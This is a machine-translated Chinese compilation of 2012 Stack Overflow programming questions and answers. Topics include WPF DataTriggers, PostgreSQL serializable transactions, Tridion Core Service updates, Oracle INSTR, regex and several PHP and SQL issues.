> 时间：2012-04-09T14:13:05.727

为什么不每次都将相同的字典返回给模板？那是（毕竟）模板的预期输入。如果您不默默地忽略问题，它将真正有助于避免模板中的潜在错误。当然，您可以跨视图抽象这些东西。

```
def _create_tmpl(name='', ...):
    return {
        'name': name,
    }

def create_view(request):
    return _create_tmpl()

def edit_view(request):
    return _create_tmpl(name='Mark') 
```

无论如何，如果你真的真的很想，你可以添加到你的设置中（可能在你的 INI 中）`mako.strict_undefined = false`。

# c# - 使 WPF 触发器使用任何属性

> ID：10069705
> 
> 赞同：1
> 
> 时间：2012-04-09T06:23:09.267
> 
> 标签：c#, wpf, properties, datagrid, styles

我用一个`Datagrid`. 在那我放了一个`Area`这样的列表：

```
ObservableCollection<Area> areas = new ObservableCollection<Area>();
...
datagrid.ItemsSource = areas; 
```

现在我想根据一个属性来设置行的样式`Area`。

```
<DataGrid.RowStyle>
   <Style TargetType="DataGridRow">
      <Style.Triggers>
         <!-- Compiler can't find UseForGroups -->
         <Trigger Property="Area.UseForGroups" Value="True">  
            <Setter Property="Background" Value="LightCoral"/>
            <Setter Property="Foreground" Value="Black"/>
         </Trigger>
      </Style.Triggers>
   </Style>
</DataGrid.RowStyle> 
```

我该如何参考`Area.UseForGroups`？

## 编辑

我尝试了以下`DataTriggers`但没有任何反应

```
<DataGrid ...>
   <DataGrid.RowStyle>
      <Style TargetType="{x:Type DataGridRow}" >
         <Style.Triggers>
            <DataTrigger Binding="{Binding UseForGroups}" Value="True">
               <Setter Property="Background" Value="LightCoral"/>
               <Setter Property="Foreground" Value="Black"/>
            </DataTrigger>
         </Style.Triggers>
      </Style>
   </DataGrid.RowStyle>
</DataGrid> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T08:00:16.143

这是使用 DataTrigger 的示例

```
<Page.Resources>
    <Style x:Key="RowStyle" TargetType="{x:Type DataGridRow}" >
        <Style.Triggers>
            <DataTrigger Binding="{Binding UseForGroups}" Value="True">
                <Setter Property="Background" Value="LightCoral"/>
                <Setter Property="Foreground" Value="Black"/>
            </DataTrigger>
        </Style.Triggers>
    </Style>
</Page.Resources>

<DataGrid RowStyle="{StaticResource RowStyle}" ...> 
```

请注意，您不应仅指定 'Area.UseForGroups' 'UseForGroups'，因为单个行的 DataContext 是一个*Area*。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:54:33.303

你试过用`DataTrigger`吗？

编辑：

常规`Trigger`响应依赖属性（通常是 GUI 属性）。

A`DataTrigger`可以响应任何 .NET 属性（通过设置其 Binding 属性）。

编辑2：

另外我认为使用 a`DataTrigger`您不需要`Area.UseForGroups`仅指定`UseForGroups`，因为您的绑定`DataGridRow`已经是类型`Area`

# sql - 编写存储过程模式和错误报告

> ID：10069706
> 
> 赞同：0
> 
> 时间：2012-04-09T06:23:34.633
> 
> 标签：sql, stored-procedures, exception-handling, plpgsql

在创建复杂的过程时，整个函数被视为一个事务，或者如果我只是将整个函数放在一个`begin ... end`. 所以如果任何中间查询失败，系统就不会出现问题。那么我需要任何错误报告吗？或`IF ... ELSE`检查错误报告？（假设外键/唯一/等..约束已正确完成）

`duplicate key value violates unique constraint`如果或者我应该依赖数据库引擎，我是否需要自己提出错误？

**在开发业务逻辑**的同时编写存储过程时是否有任何模式可以遵循？

我正在使用`PostgreSql`并且`PL/PgSQL`我以前曾经这样`ORM`做过

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T12:33:59.703

据我了解，您正在编写要从客户端代码执行的函数。一个函数的全部执行总是在一个事务中，不管你是否明确地`BEGIN`是一个事务，尽管你可以在 plpgsql 中通过使用子句编码`BEGIN`/`END`块来使用子事务。`EXCEPTION`此类子事务不是免费的，因此您只想在真正需要时使用它们。

如果可以以声明方式声明执行业务规则所需的不变量，那几乎总是比在触发器中使用命令式代码执行它们要好。 `CHECK`约束、`PRIMARY KEY`约束、`FOREIGN KEY`约束、`UNIQUE`约束和（PostgreSQL 独有的功能）`EXCLUSION`约束在覆盖用例时都应该使用而不是触发代码。

如果您使用的是 PostgreSQL 9.1 或更高版本，那么在开始之前做出的最大决定是您将使用什么策略来处理并发事务之间的竞争条件。两个主要选择是是否尝试跟踪所有可能的冲突并处理应用程序代码中的问题，或者仅使用可序列化事务（您可以在 postgresql.conf 文件中设置默认值）并让 PostgreSQL 解决问题。我在前者看到的最好的文章在这里：[http](http://www.postgresql.org/files/developer/concurrency.pdf) ://www.postgresql.org/files/developer/concurrency.pdf而关于后者的链接是：

[http://www.postgresql.org/docs/current/interactive/mvcc.html](http://www.postgresql.org/docs/current/interactive/mvcc.html)

[http://wiki.postgresql.org/wiki/SSI](http://wiki.postgresql.org/wiki/SSI)

如果您使用`SERIALIZABLE`甚至`REPEATABLE READ`事务，您应该以某种方式运行查询，以提供对序列化失败的通用处理；也就是说，如果事务抛出异常并将 SQLSTATE 设置为“40001”或“40P01”，您应该回滚失败的事务并从头开始重试。您不想在运行查询的每个地方都将其逻辑嵌入到应用程序代码中。如今，许多开发框架都允许事务注释，这使得这很容易实现。我们只在我们的商店使用可序列化的交易，它确实简化了事情，如果你能证明交易本身做了正确的事情，

请注意，由于使用可序列化快照隔离，PostgreSQL 使用可序列化事务的性能非常接近于许多工作负载不太严格的隔离级别；如果你因为担心阻塞和死锁而一直回避这个想法——不要。PostgreSQL 9.1 中的可序列化事务没有像使用严格两阶段锁定 (S2PL) 的数据库那样的问题。

全面披露：在与麻省理工学院的 Dan RK Ports 的共同努力下，并根据 Sidney 大学的 Michael J. Cahill 等人的论文，我帮助实现了 PostgreSQL 版本 9.1 的可序列化快照隔离，因为我们需要在我的工作场所使用该功能。我没有从其他人使用它获得任何经济利益，但我个人认为这通常是要走的路。我希望，这更多是我从事该功能的*原因，而不是从事该功能的**结果*。

# php - 使用单选按钮发送数据

> ID：10069709
> 
> 赞同：0
> 
> 时间：2012-04-09T06:23:55.273
> 
> 标签：php, template-lite

我需要使用单选按钮发送一些数据。

这个按钮是

```
<td>
  <span style="color:red">Sil</span>
    <input name="{$spam.encId}-{$spam.comment}-{$spam.to}-{$spam.userId}" type="radio" value="DENIED"><br>
  <span style="color:green">Onayla</span>
    <input name="{$spam.encId}-{$spam.comment}-{$spam.to}-{$spam.userId}" type="radio" value="ACCEPTED">
</td> 
```

这个按钮就是这样存在的

在 php 方面，我打印收音机保存的所有数据。问题是只有第一个按钮可以正常工作。我不能把数据放在第二个和第三个。

![在此处输入图像描述](../Images/6d10542307e2b5bf3ec7ebd879081013.png)

这是代码。可能是什么原因？

```
<form action="#" method="post">
  <div class="destek_inside" >
    <table width="1000" border="1" class="std">
      <tbody>
        <tr class="header">
          <td class="pd_5 bold per25">Kullanıcı Adı</td>
          <td class="pd_5 bold per25">İçerik</td>
          <td class="pd_5 bold per25">Yorum</td>
          <td class="pd_5 bold per25">Durum</td>
        </tr>
        {foreach from=$spams value=spam}
          <tr>
            <td class="pd_5">
              <a href="{$spam.userUrl}" class="no_link_style bordo" target="_blank">{$spam.user.username}({$spam.userId})</a>
            </td>
            <td class="pd_5">
              <a href ="{$spam.typeUrl}" target="_blank">{$spam.typeData.name} {$spam.typeData.surname}</a>
            </td>
            <td class="pd_5">{$spam.comment}</td>
            <td>
              <span style="color:red">Sil</span>
                <input name="{$spam.encId}-{$spam.comment}-{$spam.to}-{$spam.userId}" type="radio" value="DENIED"><br>
              <span style="color:green">Onayla</span>
                <input name="{$spam.encId}-{$spam.comment}-{$spam.to}-{$spam.userId}" type="radio" value="ACCEPTED">
            </td>
          </tr>
        {/foreach}
      </tbody >
    </table>
  </div>
  <p align="right"><input type="submit" name="save" value="Kaydet"/></p>
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:11:54.527

好像您将 $spam.comment 放在单选按钮的名称中。第二个条目在文本中有引号。所以你的名字无效：

«输入名称="......"c"...."

这就是您只有来自第一台收音机的数据的原因

# iphone - 核心绘图图有时不会调整大小

> ID：10069716
> 
> 赞同：0
> 
> 时间：2012-04-09T06:24:21.170
> 
> 标签：iphone, objective-c, ios, xcode, core-plot

我使用核心图创建了一个图表。图表完美地显示在屏幕上。我有一个全屏按钮点击它，popOver在更大的框架中显示图形......问题是当我调整图形大小时它不会调整大小..

如果我关闭弹出框，我仍然可以在屏幕上看到一个大字符。这不会一直发生。

在我的 .h 文件中

```
 CPGraphHostingView *scatterPlotView;
 CPXYGraph *graph, *barChart; 
```

在我的 .m 文件中

我已经创建了图表，现在在全屏按钮上单击。

```
-(void)fullviewpressed:(id)sender
{

UIViewController* popoverContent = [[UIViewController alloc]
                                    init];
UIView* popoverView = [[UIView alloc]
                       initWithFrame:CGRectMake(0, 212, 1024, 480)];

if(!UIInterfaceOrientationIsLandscape(self.interfaceOrientation))
    popoverView.frame = CGRectMake(0, 212, 768, 700);

popoverView.backgroundColor = [UIColor blackColor];
popoverContent.view = popoverView;

//resize the popover view shown
//in the current view to the view's size
popoverContent.contentSizeForViewInPopover = CGSizeMake(980, 460);

if(!UIInterfaceOrientationIsLandscape(self.interfaceOrientation))

    popoverContent.contentSizeForViewInPopover = CGSizeMake(768-40, 660);

//create a popover controller
UIPopoverController * popoverController21 = [[UIPopoverController alloc]initWithContentViewController:popoverContent];

self.popoverController = popoverController21;
[popoverController21 release];
self.popoverController.delegate = self;

CGRect btnRct = fullViewBtn.frame;
btnRct.origin.y+=20;

//present the popover view non-modal with a
//refrence to the button pressed within the current view

[self.popoverController presentPopoverFromRect:btnRct
                                        inView:self.view
                      permittedArrowDirections: UIPopoverArrowDirectionUp
                                      animated:YES];
if(UIInterfaceOrientationIsLandscape(self.interfaceOrientation))
    scatterPlotView.frame = CGRectMake(5, 10, 980, 460);
else
    scatterPlotView.frame  = CGRectMake(5, 10, 768-40, 660);
[popoverView addSubview:scatterPlotView];
    [touchView removeFromSuperview];
    touchView.frame =scatterPlotView.frame;
    [popoverView addSubview:touchView];
//release the popover content
   [popoverView release];
   [popoverContent release];
  }

 } 
```

这里的 touchView 是 UIView 的对象，用于在用户点击图表时添加注释。

简而言之，我只是在改变我的框架`CPGraphHostingView`。但为什么有时它不调整大小。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T00:49:36.167

您使用的是什么版本的 Core Plot？根据您代码中的“CP”类前缀，我怀疑它已经很老了。更新到较新版本可能会为您解决此问题。

# c# - 包含 8 个字母和数字字符的表达式

> ID：10069718
> 
> 赞同：0
> 
> 时间：2012-04-09T06:24:27.727
> 
> 标签：c#, regex

我想要一个包含字母和数字字符且必须至少为 8 个字符的正则表达式。所有字符都可以是字母或数字。我的表达式是

```
^[a-zA-Z0-9]*$ 
```

请纠正它不占用 8 个字符，我是第一次使用它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:25:49.143

您可以使用：

```
^[a-zA-Z0-9]{8,}$ 
```

# php - 以不同方式显示字符串

> ID：10069720
> 
> 赞同：0
> 
> 时间：2012-04-09T06:25:05.823
> 
> 标签：php, html, css

我正在为新闻显示创建一个模块。我想知道是否有更好的方法来显示我的文章信息。我希望能够以不同的方式显示信息部分，具有开/关功能。例如：

1.  标题
2.  文本
3.  阅读更多
4.  日期
5.  作者

要不就

1.  阅读更多
2.  标题

我正在考虑这段代码，但我相信有更好的解决方案？

```
<div id="pos1">
<?php
if ( show = 1 ) {
echo 'Here will be title';
elseif ( show = 2 ) {
echo 'Here will be text';
elseif ( show = 3 ) {
echo 'Here will be readmore';
.....
else { $string = 'nothing here'; }
?></div>

<div id="pos2">
<?php
if ( showsecond = 1 ) {
echo 'Here will be title';
elseif ( showsecond = 2 ) {
echo 'Here will be text';
elseif ( showsecond = 3 ) {
echo 'Here will be readmore';
.....
else { $string = 'nothing here'; }
?></div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:32:02.173

你可以这样做：

```
$info = array(
    1 => 'This will be the title',
    2 => 'this will be the text',
    3 => 'This is the readmore',
    4 => 'Date',
    5 => 'Author'
);

echo $info[$show]; 
```

**编辑：**

```
$info = array(
    1 => array(
        'text' => 'This will be the title',
        'styles' => 'styling info goes here'
    ),
    2 => array(
        'text' => 'This will be the author',
        'styles' => 'styling info goes here'
    ),
    3 => array(
        'text' => 'This will be the date',
        'styles' => 'styling info goes here'
    )
);

echo $info[$show]['text']; 
```

# tridion - 使用 SDL Tridion 2011 中的核心服务更新组件

> ID：10069726
> 
> 赞同：2
> 
> 时间：2012-04-09T06:25:54.650
> 
> 标签：tridion

我正在使用 Tridion 2011 中的核心服务更新组件。

示例代码如下，

```
string COMPONENT_URI = "tcm:8-674";
string SCHEMA_URI = "tcm:8-426-8";

ComponentData component = client.TryCheckOut(COMPONENT_URI, null) as ComponentData;

try
{
    Response.Write("<BR>" + component.Content);
    XDocument xdoc = XDocument.Parse(component.Content);
    var element = xdoc.Elements("first").Single();
    element.Value = "updated";
    xdoc.Save(component.Content);
    client.Save(component, null);
    Response.Write("<BR"+"SAVED");
}
catch (Exception ex)
{
    Response.Write("Unable to save comp" + ex.Message);
}

client.CheckIn(COMPONENT_URI, null); 
```

我收到以下异常：

```
 Unable to save compSequence contains no elements 
```

细节：

`first`- 组件中的字段名称

有人可以帮忙吗？

谢谢

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-09T13:31:46.670

Tridion 中组件的 XML 格式如下：

```
<Content xmlns="uuid:2607D20D-1B22-4994-98C1-66D9ACF85C20">
  <first>The value of my first field</first>
  <second>The value of my second field</second>
</Content> 
```

您的相关代码段是：

```
var element = xdoc.Elements("first").Single(); 
```

这是未能选择一个元素，因为它是：

1.  不为选择提供命名空间
2.  只选择文档根目录的直接子节点

如果您不指定命名空间，您似乎希望默认命名空间会被自动选择，但事实并非如此。一旦有了处理名称空间的 XML，每个查询都必须指定正确的名称空间。

如果你修改代码来处理这两个问题，它应该看起来像这样：

```
XNamespace ns = xdoc.Root.GetDefaultNamespace();
var element = xdoc.Descendants(ns+"first").Single(); 
```

您可能需要考虑阅读 .NET 处理 XML 中的命名空间以及一般的 XML 命名空间，因为这是一个非常常见的错误，您只需快速退出系统即可。

[在您发现此处](http://code.google.com/p/tridion-practice/wiki/ChangeContentOrMetadata)提供的帮助程序类有用之前，希望通过核心服务更新组件 XML 的人。

此外，正如 Mihai 指出的那样，您调用的方式`XDocument.Save`是错误的。它需要一个文件名作为它的参数，而你正在向它传递你的组件的 XML。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T07:07:38.633

您的代码尝试将 XML DOM 保存到文件中。

`XDocument.Save(string fileName)`- 将此序列化为`XDocument`一个文件，覆盖现有文件（如果存在）。

你应该使用这样的东西：

```
using (var client = new SessionAwareCoreServiceClient(netTcpBinding, remoteAddress))
{
    ReadOptions readOptions = new ReadOptions();
    ComponentData component = client.Read(compTcmUri, readOptions) as ComponentData;
    XDocument dom = XDocument.Parse(component.Content);
    // do your modifications to dom
    component.Content = dom.ToString();
    component = client.Update(component, readOptions) as ComponentData;

    Console.WriteLine("Component updated: " + component.LocationInfo.WebDavUrl);
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-11T23:12:21.770

有时，特别是如果您要从充当主存储库的不同存储库同步内容，您可以从头开始重建组件。在这种情况下，这是一个如何做到这一点的基本示例：

```
 public static void updateComponent()
    {
        string componentWdUrl = "/webdav/020%20Content/Building%20Blocks/Content/wstest/testComponent.xml";
        CoreServicesUtil coreServicesUtil = new CoreServicesUtil();
        coreServicesUtil.coreServiceClient.CheckOut(componentWdUrl, true, coreServicesUtil.readOptions);
        ComponentData componentData = coreServicesUtil.getComponentData(componentWdUrl);
        SchemaData schemaData = coreServicesUtil.getSchemaData(componentData.Schema.IdRef);
        componentData.Content = xmlUtil.GetNewXmlNode("Content", schemaData.NamespaceUri);
        componentData.Metadata = xmlUtil.GetNewXmlNode("Metadata", schemaData.NamespaceUri);
        componentData.AddSingleField("singlefield", "singlefield sample", schemaData.NamespaceUri);
        componentData = (ComponentData)coreServicesUtil.coreServiceClient.Save(componentData, coreServicesUtil.readOptions);
        coreServicesUtil.coreServiceClient.CheckIn(componentData.Id, coreServicesUtil.readOptions);
        coreServicesUtil.coreServiceClient.Close();
    } 
```

文章中解释了有关此示例中使用的方法的更多描述：

[使用核心服务创建组件时出现故障状态错误](https://stackoverflow.com/questions/9922827/faulted-state-error-while-creating-component-with-core-service/9927424#9927424)

# php - MySQL：CDbConnection 未能打开数据库连接

> ID：10069727
> 
> 赞同：0
> 
> 时间：2012-04-09T06:25:58.883
> 
> 标签：php, mysql

当我在互联网上上传我的网站时出现此错误。这是整个错误

```
CDbConnection failed to open the DB connection: SQLSTATE[28000] [1045] Access denied for user 'glochina_ehsan'@'localhost' (using password: YES) 
```

这是我的配置文件中的代码。

```
'connectionString' => 'mysql:host=localhost;port=3306;dbname=golchina_sanayedasti',
            'emulatePrepare' => true,
            'username' => 'glochina_ehsan',
            'password' => '**',
            'charset' => 'utf8', 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:34:54.503

您的数据库前缀是“golchina”，而您的用户名前缀是“glochina”。

“o”和“l”颠倒了。这是故意的还是错字？

# css - Firefox vs. Chrome CSS 排队问题

> ID：10069728
> 
> 赞同：0
> 
> 时间：2012-04-09T06:26:08.033
> 
> 标签：css, cross-browser, ubuntu-11.10

*（见附件 jsfiddle，截图；在 Ubuntu 11.10 上运行浏览器）*

当我尝试将 div 放入其他 div 时，似乎存在某种排队问题。我不知道该怎么解释，所以请看下面的截图，你也可以看看我的 jsfiddle。

截图（左边是firefox，右边是chrome）： ![在此处输入图像描述](../Images/ad25ba2c7363826fcf5a6c176a72e7a7.png)

jsfiddle：http: [//jsfiddle.net/kWLbS/1/](http://jsfiddle.net/kWLbS/1/)

我只是想让带有金色背景的 div 很好地适合工具栏，仅此而已！不知道为什么我一直在两个浏览器之间遇到这个“偏离一个像素”的问题。在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:37:37.550

在 Firefox 中也适用于我，但请尝试[http://jsfiddle.net/a5vJC/](http://jsfiddle.net/a5vJC/)

我怀疑真正的问题是字体的差异。它们看起来相似，但有细微的差别。我认为如果您手动设置字体也可能解决问题，尽管我不是这样做的。

# oracle - 从字符串中获取特定的单词，ORACLE

> ID：10069733
> 
> 赞同：1
> 
> 时间：2012-04-09T06:26:39.573
> 
> 标签：oracle, plsql

有没有人知道如何使用 pl/sql 从一个巨大的字符串中获取一个特定的字符串，我是创建查询的初学者，所以任何帮助都会很有用。顺便说一句，我不想​​使用该功能： select substr( *** , * ,* ) from * 因为输入是可变的，所以任何人都可以帮助我解决这个问题，你是否建议我使用 block instate 。

感谢和问候，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T06:41:32.400

听起来您正在寻找更大字符串中的特定字符串。如果是这样，您可能正在寻找的功能是 INSTR：

[http://docs.oracle.com/cd/B28359_01/olap.111/b28126/dml_functions_1103.htm](http://docs.oracle.com/cd/B28359_01/olap.111/b28126/dml_functions_1103.htm)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T06:54:04.220

据我对您的问题的理解，您想`check`知道 a`specific word`中是否存在 a `string or not` ，如果这是问题，您可以在下面找到解决方案。

```
DECLARE
v_string VARCHAR2(200):='MY NAME IS GAURAV SONI';
v_check PLS_INTEGER;
BEGIN

v_check:=INSTR(v_string,'GAURAV'); --this is case sensitive 

IF v_check >0 THEN 
dbms_output.put_line('Word exists');
END IF;

END; 
```

在上面的块中，我们`GAURAV`在字符串中搜索 Word`MY NAME IS GAURAV SONI`并且该单词存在于适当的`12`位置。

请注意这是`Case sensitive`，如果您输入单词`gaurav`，则值`v_check`将是`zero`。

如果您正在寻找`Case insensitive`然后在 oracle`REGEXP_INSTR`中使用 REGULAR EXPRESSIONS 代替.Read `INSTR`oracle 文档，然后再使用此功能[REGEXP_INSTR](http://docs.oracle.com/cd/B19306_01/server.102/b14200/functions129.htm#i1239887)

[在 SQL Fiddle 中制定了示例](http://sqlfiddle.com/#!4/d41d8/245)

# shell - 运行 sql 查询的 shell 脚本

> ID：10069738
> 
> 赞同：-2
> 
> 时间：2012-04-09T06:27:47.760
> 
> 标签：shell

任何人都可以帮助创建shell脚本，连接到Sql并运行指定的查询以及连接ftp服务器的语法。

在此先感谢拉马纳

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:37:45.323

我假设您的数据库是 oracle。阅读[此](http://dbamac.wordpress.com/2008/08/01/running-sqlplus-and-plsql-commands-from-a-shell-script/)链接。

我只会在这里说如何创建一个 csv：

只需修改您的 sql 查询：例如：

```
select empid,empname..... 
```

应该改为

```
select empid||','||empname.... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:51:22.147

我按照以下方式运行 sql 查询。我不知道它是否是标准。

```
 ORACLE_HOME=/u01/app/oracle/product/9.2.0;export ORACLE_HOME
    ORACLE_SID=sidname;export ORACLE_SID
    USERID=usename;export USERID
    USERPASS=`cat path to .pass file`;export USERPASS #/netflow/oracle/.pass

//connect to db as superuser
 su - oracle <<!
/u01/app/oracle/product/9.2.0/bin/sqlplus -s username/password<<!
    @filename.sql >csvfilename.csv 
```

# windows-phone-7 - 如何在 Windows Phone7 中创建 Telerik 网格

> ID：10069744
> 
> 赞同：1
> 
> 时间：2012-04-09T06:28:13.047
> 
> 标签：windows-phone-7, telerik, rad-controls

我是开发 windows phone 应用程序的新手，我有一个小查询，是否可以使用 Telerik Radcontrols 在 windows phone7 应用程序中以网格格式显示数据。如果可能，请建议我它是如何做的，或者你能提供任何链接.

请高手帮帮我...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T03:37:34.620

没有 Telerik Grid for Windows Phone 7 这样的东西。您要么必须创建自己的自定义控件才能在 UI 中实现类似网格的演示

# facebook - 如何检查哪些 Facebook 用户“允许”了我的应用程序？

> ID：10069754
> 
> 赞同：0
> 
> 时间：2012-04-09T06:29:55.897
> 
> 标签：facebook, facebook-graph-api

我想获取“允许”我的 facebook 连接应用程序的 facebook 用户列表。（我要求提供电子邮件，publish_stream）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:47:09.690

这是一个 facebook 开发者网站链接。 [https://developers.facebook.com/tools/explorer/?method=GET&path=me%2Fpermissions](https://developers.facebook.com/tools/explorer/?method=GET&path=me%2Fpermissions) 如果用户允许您的应用程序，那么它将返回具有以下设置的结果

```
 [installed] => 1
                [status_update] => 1
                [photo_upload] => 1
                [video_upload] => 1
                [email] => 1
                [create_note] => 1
                [share_item] => 1
                [publish_stream] => 1
                [publish_actions] => 1
                [user_birthday] => 1
                [user_photos] => 1
                [user_status] => 1 
```

如果用户跳过允许在 facebook 上发帖的步骤，那么结果将是

```
 [installed] => 1
                [email] => 1
                [user_birthday] => 1
                [user_photos] => 1
                [user_status] => 1 
```

您可以使用 [publish_stream] => 1 和 [publish_actions] => 1 来检查用户是否允许应用。

# sql - SQL Server 查询员工明智的月度考勤报告

> ID：10069763
> 
> 赞同：2
> 
> 时间：2012-04-09T06:30:57.193
> 
> 标签：sql, crystal-reports

我有一个结构类似的数据库

用户：

```
 usr_id
    usr_fname
    usr_lname
    usr_uname
    usr_pass 
```

组织机构：

```
 org_id
    org_name
    org_address
    org_tel
    org_web
    org_email
    org_cat
    org_desc 
```

部门：

```
 dpt_id
    dpt_name
    dpt_desc 
```

部分：

```
 sec_id
    sec_dpt_id
    sec_name
    sec_desc 
```

名称：

```
 dsg_id
    dsg_sec_id
    dsg_name
    dsg_desc 
```

员工：

```
 emp_id
    emp_fname
    emp_lname
    emp_phone
    emp_email
    emp_addr
    emp_join_dt
    emp_salary
    emp_card_no
    emp_dsg_id
    emp_sft_id 
```

转移：

```
 sft_id
    sft_name
    sft_from
    sft_to
    sft_desc 
```

树叶：

```
 lev_id
    lev_emp_id
    lev_frm
    lev_to
    lev_desc 
```

假期：

```
 hld_id
    thl_tp_id
    hld_st_dt
    hld_end_dt
    hld_cmnt 
```

假日类型：

```
 hld_tp_id
    hld_tp_name
    hld_tp_desc 
```

出席：

```
 att_id
    att_emp_id
    att_time
    att_date
    att_dir 
```

任何人都可以帮助我查询生成员工明智的每月出勤报告，其中每个日期的超时时间和“缺勤”将用于缺勤天数吗？

我的报告将是这样的：

```
Date        Attendance     Shift    In time      Out time
---------------------------------------------------------------------
   1        Present          A     12:40 PM      06:40 PM
   2        Absent           A       N/A           N/A
   3
   .
   .
   .
  31        Present          B     07:00 PM      11:00 PM
---------------------------------------------------------------------
Total 
```

到目前为止我已经做了：

```
select att_date, att_time as in_time, shifts.sft_name from attendance
    join employee on (attendance.att_emp_id = employee.emp_id)
    join shifts on (employee.emp_sft_id = shifts.sft_id)
where att_dir = 'In' and
att_time <= (
    select sft_from from shifts
    where sft_id = (
        select emp_sft_id from employee
        where emp_id = 5
    )
) and
att_date between '2012-04-01' and DATEADD(MONTH,1,'2012-04-01') and
att_date not in(
    select hld_dt from holidays
) 
```

但我需要一个月内所有日期的列表，并且此查询检索到的数据应放在该日期的行中。请帮助...我非常需要它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:42:56.637

看看在[ssrs 图表的 sql 查询表达式中处理不存在的值](https://stackoverflow.com/questions/9691824/handling-non-existent-values-in-sql-query-expression-for-ssrs-chart/9692399#9692399)

您需要一个包含日期的表才能完成这项工作（或者您可以使用存储过程/公用表表达式或其他动态生成日期的方法）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-13T06:53:54.883

您需要为报表创建一个视图，其中包含员工表、出勤表、薪水或支付表（如果有）和您的班次表，创建一个视图并将该视图调用到报表中，并在报表中创建一个函数查看器并给它一个查询以从该视图中选择，如果您需要任何帮助，请告诉我。

# php - 在 html/php 上加载预先完成的 word 文档

> ID：10069765
> 
> 赞同：0
> 
> 时间：2012-04-09T06:31:27.540
> 
> 标签：php, html, templates, document, auto-generate

我想知道，鉴于我们已经在其中放置了模板，是否可以为公司自动生成信头？

可以说，发票、交货单、付款凭证等都有不同类型的模板/格式，因此我们需要不同的自动生成内容。

内容等必须手动输入，但参考编号和日期将根据系统时间和日期自动生成。并且页眉和页脚已经存在。

是否可以让模板在论坛和其他在线编辑器中具有文本编辑器界面，以便我们可以将字母加粗，添加表格等。我目前正在考虑 TinyMCE，但不确定如何将它们与模板集成在一起，因为我遇到了 php 问题。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:46:47.243

我听说的唯一可以做到这一点的工具是：[http](http://www.phpdocx.com/) ://www.phpdocx.com/和[http://www.phplivedocx.org/](http://www.phplivedocx.org/)

您还可以考虑创建 PDF 文档，然后可以使用[FPDF](http://www.fpdf.org/)。

更新：我没有意识到[PHPWord](http://phpword.codeplex.com)现在支持模板。既然如此，我将从那里开始。

# java - 是否有一个很好的 Play 替代品可以与 DynamoDB 一起用于 AWS 上的 Web 应用程序？

> ID：10069766
> 
> 赞同：3
> 
> 时间：2012-04-09T06:31:42.007
> 
> 标签：java, model-view-controller, mongodb, playframework, amazon-dynamodb

我正在为最终用户设计一个图像存储应用程序，它将具有许多 CRUD 类型的功能。我想在 Amazon Web Services (AWS) 上托管应用程序，并且打算使用该游戏！框架、S3 和 NoSQL 数据库。我找不到适用于 Play 的 DynamoDB 适配器！并且读到 MongoDB 和 EC2 不能相处得很好。

是否有可以与 DynamoDB 一起使用的 Play 替代品？

是否有我应该考虑的替代框架（Play！看起来对我很有吸引力，干净、精简和简单）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T04:54:20.453

Play 与数据库无关，但它确实支持其他较新的数据存储。Dynamo 太新了，无法直接在 Web 框架中获得太多支持。Play 是一个很好的框架，我个人非常喜欢它。虽然我使用 Play 2.0，但我不建议完全不熟悉 scala 或 FP 的人使用它。他们说你也不需要知道，但在产品更成熟之前，这是一厢情愿的想法。

底线是您分别选择您的 Web 框架和数据存储。每个人都应该有灵活性来支持另一个人的许多选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-15T21:57:04.393

遇到了这个：[https](https://github.com/wfaler/scala-dynamo) ://github.com/wfaler/scala-dynamo 看起来像是第一次尝试 scala 驱动程序的发电机。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-30T07:49:44.120

检查[jcabi-dynamo](http://www.jcabi.com/jcabi-dynamo/index.html)。它是 DynamoDB SDK 之上的一个对象层，例如：

```
Credentials credentials = new Credentials.Simple("AWS key", "AWS secret");
Region region = new Region.Simple(credentials);
Table table = region.table("foo");
Collection<Item> items = table.frame().where("id", Conditions.equalTo(123));
for (Item item : items) {
  System.out.println(item.get("name").getS());
} 
```

# java - java HttpClient-4.1.2 jar

> ID：10069768
> 
> 赞同：0
> 
> 时间：2012-04-09T06:31:58.680
> 
> 标签：java, exception, verifyerror

我在我的项目中使用 httpclient-4.1.2 jar 文件，并编写代码：

```
HttpClient client = new DefaultHttpClient(); 
```

但它抛出异常

> 线程“主”java.lang.VerifyError 中的异常：（类：org/apache/http/impl/client/DefaultHttpClient，方法：setDefaultHttpParams 签名：(Lorg/apache/http/params/HttpParams;)V）函数参数不兼容

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:37:50.190

参数“HttpParams”实际上是一个接口，需要作为参数发送到`setDefaultHttpParams`.

您是否正在构建它并且正在发送它？为了发送它，你需要有一些其他的罐子，这就是问题所在。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:35:21.500

您还必须为 httpclient 提供其他 jars（例如 httpcore，还有很多 apache commons）。

# xml - XSLT 1.0：使用 XSLT 获取两个日期之间的日期列表

> ID：10069770
> 
> 赞同：2
> 
